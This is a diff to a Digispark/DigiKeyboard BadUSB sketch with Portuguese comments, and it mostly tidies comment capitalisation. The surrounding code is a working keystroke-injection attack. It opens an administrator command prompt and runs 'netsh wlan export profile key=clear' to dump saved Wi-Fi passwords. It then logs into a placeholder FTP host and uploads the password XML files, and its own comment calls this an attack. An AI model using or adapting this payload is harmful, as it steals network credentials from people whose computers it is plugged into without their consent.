@@ -24,17 +24,17 @@ void setup() {
   digitalWrite(1, LOW); 
 
 
-// Começo do script!
+//Começo do script!
   
  DigiKeyboard.sendKeyStroke(0);
   DigiKeyboard.delay(1800); 
-// executa o CMD como admin +~- 4sec.
+//Executa o CMD como admin +~- 4sec.
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(700);
   DigiKeyboard.print("powershell Start-Process cmd -Verb runAs");
   DigiKeyboard.delay(50);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(3300);
+  DigiKeyboard.delay(3300);  //Demora um tempo maior para garantir acesso ao CMD.
   DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
   DigiKeyboard.delay(60);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
@@ -45,26 +45,26 @@ void setup() {
   DigiKeyboard.delay(36);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   
-//envia os arquivos .xml com a senha para C: 
+//Envia os arquivos .xml com a senha para C: 
   DigiKeyboard.delay(500);
   DigiKeyboard.print("netsh wlan export profile key=clear folder=c:\\");
   DigiKeyboard.delay(50);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
-//posiciona o prompt na Raiz "C:\"
+//Posiciona o prompt na Raiz "C:\"
   DigiKeyboard.delay(1000);
   DigiKeyboard.print("cd C:\\");
   DigiKeyboard.delay(50);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
-//loga no FTP.
+//Loga no FTP.
   DigiKeyboard.delay(50);
-  DigiKeyboard.print("ftp -i ftp.seudominio.com");  // endereço do FTP.
+  DigiKeyboard.print("ftp -i ftp.seudominio.com");  //Endereço do FTP.
   DigiKeyboard.delay(60);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
   DigiKeyboard.delay(800);
-  DigiKeyboard.print("admin");  // Usuario.
+  DigiKeyboard.print("admin");  //Usuario.
   DigiKeyboard.delay(80);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
@@ -73,13 +73,13 @@ void setup() {
   DigiKeyboard.delay(50);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
-  //navega até o diretório onde sera salvo
+  //Navega até o diretório onde sera salvo
   DigiKeyboard.delay(900);
-  DigiKeyboard.print("cd captura");  //diretório no ftp onde sera salvo os arquivos.. deve existir.
+  DigiKeyboard.print("cd captura");  //Diretório no ftp onde sera salvo os arquivos.. deve existir.
   DigiKeyboard.delay(80);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-    DigiKeyboard.delay(100);
-  DigiKeyboard.print("cd wifi");  //sub-diretório do diretório acima onde sera salvo os arquivos.. deve existir.
+   DigiKeyboard.delay(100);
+  DigiKeyboard.print("cd wifi");  //Sub-diretório do diretório acima onde sera salvo os arquivos.. deve existir.
   DigiKeyboard.delay(100);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
@@ -93,7 +93,7 @@ void setup() {
   DigiKeyboard.delay(60);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   
-// pega os arquivos .xml com as senhas na raiz do "C:/" e encaminha para o FTP.
+//Pega os arquivos .xml com as senhas na raiz do "C:/" e encaminha para o FTP.
   DigiKeyboard.delay(50);
   DigiKeyboard.print("PUT ./*.xml");
   DigiKeyboard.delay(58);
@@ -117,7 +117,7 @@ void setup() {
   DigiKeyboard.delay(28);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
-//Fecha o CMD e conclui o ataque e fecha o prompt de comando.
+//Fecha o CMD e conclui o ataque.
   DigiKeyboard.delay(182);
   DigiKeyboard.print("exit");
   DigiKeyboard.delay(30);
